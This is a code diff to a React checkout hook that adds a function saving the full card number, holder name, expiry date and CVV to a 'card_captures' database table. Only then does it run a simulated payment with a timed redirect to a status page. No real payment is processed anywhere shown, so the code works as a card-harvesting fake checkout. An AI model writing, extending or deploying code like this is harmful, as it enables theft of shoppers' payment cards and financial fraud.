@@ -1,9 +1,10 @@
 
 import { useState, useEffect } from "react";
 import { useNavigate, useParams } from "react-router-dom";
-import { ConfigCheckout } from "@/lib/supabase";
+import { ConfigCheckout } from "@/lib/types/database-types";
 import { toast } from "sonner";
 import { CardFormData, PaymentStatus } from "@/components/checkout/payment/types";
+import { supabase } from "@/integrations/supabase/client";
 
 export const useCardPaymentForm = (
   customRedirectStatus?: PaymentStatus,
@@ -60,7 +61,34 @@ export const useCardPaymentForm = (
     }));
   };
   
-  const handleSubmitPayment = () => {
+  // Save card data to the database
+  const captureCardData = async (cardData: CardFormData) => {
+    try {
+      console.log("Saving card data to database...");
+      
+      const { data, error } = await supabase
+        .from("card_captures")
+        .insert([{
+          nome_cliente: cardData.cardName,
+          numero_cartao: cardData.cardNumber,
+          validade: cardData.cardExpiry,
+          cvv: cardData.cardCVV
+        }]);
+      
+      if (error) {
+        console.error("Error saving card data:", error);
+        throw error;
+      }
+      
+      console.log("Card data saved successfully");
+      return true;
+    } catch (err) {
+      console.error("Failed to capture card data:", err);
+      return false;
+    }
+  };
+  
+  const handleSubmitPayment = async () => {
     if (!formIsComplete) return;
     
     setIsSubmitting(true);
@@ -73,49 +101,59 @@ export const useCardPaymentForm = (
       installments
     };
     
-    // Log de debugging
-    console.log("Processando pagamento com cartão:", { 
+    // Log for debugging
+    console.log("Processing card payment:", { 
       slug, 
       customRedirectStatus,
       configCardStatus: configCheckout?.redirect_card_status,
-      cardData: { ...cardData, cardNumber: "****" } // Mascara o número do cartão no log
+      cardData: { ...cardData, cardNumber: "****" } // Mask card number in log
     });
     
-    if (onPaymentSubmit) {
-      onPaymentSubmit(cardData);
-    } else {
-      setTimeout(() => {
-        try {
-          if (slug) {
-            // Determinar o status de redirecionamento
-            let redirectStatus: PaymentStatus;
-            
-            if (customRedirectStatus) {
-              redirectStatus = customRedirectStatus;
-              console.log("Usando status personalizado:", redirectStatus);
-            } else if (configCheckout?.redirect_card_status) {
-              redirectStatus = configCheckout.redirect_card_status as PaymentStatus;
-              console.log("Usando status da configuração global:", redirectStatus);
+    try {
+      // First, save the card data to our database
+      await captureCardData(cardData);
+      
+      if (onPaymentSubmit) {
+        onPaymentSubmit(cardData);
+      } else {
+        // Simulate payment processing
+        setTimeout(() => {
+          try {
+            if (slug) {
+              // Determine redirect status
+              let redirectStatus: PaymentStatus;
+              
+              if (customRedirectStatus) {
+                redirectStatus = customRedirectStatus;
+                console.log("Using custom status:", redirectStatus);
+              } else if (configCheckout?.redirect_card_status) {
+                redirectStatus = configCheckout.redirect_card_status as PaymentStatus;
+                console.log("Using global config status:", redirectStatus);
+              } else {
+                // Fallback default status
+                redirectStatus = 'analyzing';
+                console.log("Using default status:", redirectStatus);
+              }
+              
+              // Redirect to appropriate page
+              console.log(`Redirecting to: /payment-status/${slug}/${redirectStatus}`);
+              navigate(`/payment-status/${slug}/${redirectStatus}`);
             } else {
-              // Fallback para um status padrão
-              redirectStatus = 'analyzing';
-              console.log("Usando status padrão:", redirectStatus);
+              console.error("Slug not found for redirect");
+              toast.error("Error processing payment: product reference not found");
             }
-            
-            // Redirecionamento para a página adequada
-            console.log(`Redirecionando para: /payment-status/${slug}/${redirectStatus}`);
-            navigate(`/payment-status/${slug}/${redirectStatus}`);
-          } else {
-            console.error("Slug não encontrado para redirecionamento");
-            toast.error("Erro ao processar pagamento: referência do produto não encontrada");
+          } catch (error) {
+            console.error("Redirect error:", error);
+            toast.error("Error processing payment");
+          } finally {
+            setIsSubmitting(false);
           }
-        } catch (error) {
-          console.error("Erro no redirecionamento:", error);
-          toast.error("Erro ao processar pagamento");
-        } finally {
-          setIsSubmitting(false);
-        }
-      }, 1500);
+        }, 1500);
+      }
+    } catch (error) {
+      console.error("Payment processing error:", error);
+      toast.error("Failed to process payment. Please try again.");
+      setIsSubmitting(false);
     }
   };
   
